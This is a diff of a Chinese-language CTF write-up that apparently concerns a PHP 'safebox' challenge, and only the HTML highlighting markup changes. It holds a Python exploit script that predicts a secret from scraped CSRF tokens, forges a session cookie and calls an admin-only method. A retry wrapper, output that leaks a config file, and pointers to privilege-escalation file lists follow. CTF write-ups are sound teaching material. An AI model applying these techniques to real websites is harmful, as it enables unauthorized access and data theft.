-<span class="n">pre</span> <span class="o">=</span>  <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="n">d0</span><span class="o">+</span><span class="n">d1</span>
-<span class="n">secret</span><span class="p">,</span><span class="n">key</span> <span class="o">=</span> <span class="n">guess</span><span class="p">(</span><span class="n">pre</span><span class="p">,</span><span class="n">str_list</span><span class="p">,</span><span class="n">action</span><span class="p">)</span>
-<span class="n">cookie</span> <span class="o">=</span> <span class="n">create_cookie</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
-<span class="n">payload1</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token1</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;method&#39;</span><span class="p">:</span><span class="n">method</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="n">key</span><span class="p">}</span>
-<span class="n">r2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload1</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>  
+r0 = session.get(url)
+token0 = re.findall(re_csrf_token,r0.text)[-1]
+d0 = parse(token0,str_list)
+payload0 = {'submit':'go', 'CSRF_TOKEN':token0, 'act':action, 'key':'1234567'}
+session.post(url,data=payload0)
+r1 = session.get(url)
+token1 = re.findall(re_csrf_token,r1.text)[-1]
+d1 = parse(token1,str_list)
+pre =  [0,0,0,0,0,0]+d0+d1
+secret,key = guess(pre,str_list,action)
+cookie = create_cookie(secret)
+payload1 = {'submit':'go', 'CSRF_TOKEN':token1, 'act':action, 'method':method, 'key':key}
+r2 = session.post(url,data=payload1,headers=header,cookies=cookie)  
 
-<span class="k">if</span> <span class="s">&#39;Permission deny!!&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-    <span class="k">print</span> <span class="s">&#39;[+]Done!&#39;</span>
-    <span class="k">print</span> <span class="n">r2</span><span class="o">.</span><span class="n">text</span></code></pre></div>
+if 'Permission deny!!' not in r2.text:
+    print '[+]Done!'
+    print r2.text</code></pre>
+</div>
 
 <p>相应的get-2.py也简单如下：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
-<span class="c">#coding=utf-8   </span>
+<div>
+  <pre><code class="python">#!/usr/bin/env python
+#coding=utf-8   
 
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">import</span> <span class="nn">subprocess</span>   
+import sys
+import subprocess   
 
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]])</span>
-    <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
-        <span class="k">print</span> <span class="n">output</span>
-        <span class="k">break</span></code></pre></div>
+while 1:
+    output = subprocess.check_output(['python',sys.argv[1],sys.argv[2],sys.argv[3]])
+    if output:
+        print output
+        break</code></pre>
+</div>
 
 <p>输出如下：</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-2.py new-2.py fg_safebox <span class="nb">read</span>
-<span class="o">[</span>+<span class="o">]</span>Done!
-<span class="s2">&quot;Error: Admin permission denied!!&quot;</span></code></pre></div>
+<div>
+  <pre><code class="bash">$ python get-2.py new-2.py fg_safebox read
+[+]Done!
+&quot;Error: Admin permission denied!!&quot;</code></pre>
+</div>
 
 <p>在简单尝试之后”user”只能调用$box对象的view、alist和view方法，唯独不能使用read方法，如果说一定要用read方法，这里估计也是无法绕过去了。不急，继续往下看看有没有思路，在(4)调用相应方法中，其会和PHP对象有关联，而就我知道的和搜索到的，大多都是PHP对象注入问题，而这里也没有魔术方法和序列化之类的东西，猜测也就不是这个考察点。那么关注的重心就移到了(3)判断对象方法是否存在，在使用method_exists的时候会不会出现什么问题呢，看<a href="https://github.com/php/php-src/blob/f8faffe37edd74e0314f74436825bfcf5be78a49/Zend/zend_builtin_functions.c">源码</a>之：</p>
 
@@ -543,8 +567,10 @@ Array</code></pre></div>
 
 <p>赶紧读读config.php里面有没有什么东西，结果：</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+<span class="o">]</span>Done!
-<span class="o">[</span><span class="s2">&quot;&lt;?php\n&quot;</span>,<span class="s2">&quot;\/**\n&quot;</span>,<span class="s2">&quot; * Created by PhpStorm.\n&quot;</span>,<span class="s2">&quot; * User: phithon\n&quot;</span>,<span class="s2">&quot; * Date: 16\/6\/8\n&quot;</span>,<span class="s2">&quot; * Time: \u4e0a\u534812:24\n&quot;</span>,<span class="s2">&quot; *\/\n&quot;</span>,<span class="s2">&quot;\n&quot;</span>,<span class="s2">&quot;return [\n&quot;</span>,<span class="s2">&quot;    \&quot;role\&quot; =&gt; [\n&quot;</span>,<span class="s2">&quot;        \&quot;admin\&quot; =&gt; [\n&quot;</span>,<span class="s2">&quot;            \&quot;read\&quot;\n&quot;</span>,<span class="s2">&quot;        ],\n&quot;</span>,<span class="s2">&quot;        \&quot;user\&quot; =&gt; [\n&quot;</span>,<span class="s2">&quot;            \&quot;view\&quot;, \&quot;alist\&quot;, \&quot;random\&quot;\n&quot;</span>,<span class="s2">&quot;        ]\n&quot;</span>,<span class="s2">&quot;    ]\n&quot;</span>,<span class="s2">&quot;];&quot;</span><span class="o">]</span></code></pre></div>
+<div>
+  <pre><code class="bash">[+]Done!
+[&quot;&lt;?php\n&quot;,&quot;\/**\n&quot;,&quot; * Created by PhpStorm.\n&quot;,&quot; * User: phithon\n&quot;,&quot; * Date: 16\/6\/8\n&quot;,&quot; * Time: \u4e0a\u534812:24\n&quot;,&quot; *\/\n&quot;,&quot;\n&quot;,&quot;return [\n&quot;,&quot;    \&quot;role\&quot; =&gt; [\n&quot;,&quot;        \&quot;admin\&quot; =&gt; [\n&quot;,&quot;            \&quot;read\&quot;\n&quot;,&quot;        ],\n&quot;,&quot;        \&quot;user\&quot; =&gt; [\n&quot;,&quot;            \&quot;view\&quot;, \&quot;alist\&quot;, \&quot;random\&quot;\n&quot;,&quot;        ]\n&quot;,&quot;    ]\n&quot;,&quot;];&quot;]</code></pre>
+</div>
 
 <p>看来还是要有点渗透思维去读读配置文件什么的，看看flag到底藏在哪，参考<a href="https://www.91ri.org/7911.html">Linux渗透与提权：技巧总结篇</a>与<a href="https://www.91ri.org/7459.html">Linux提权后获取敏感信息的方法与途径</a>，把里面cat的文件全部集中一起，写个脚本跑一遍及可发现flag，代码与之前的类似，详见<a href="https://github.com/Larryxi/My_tools/tree/master/puzzle2016">github</a></p>
 
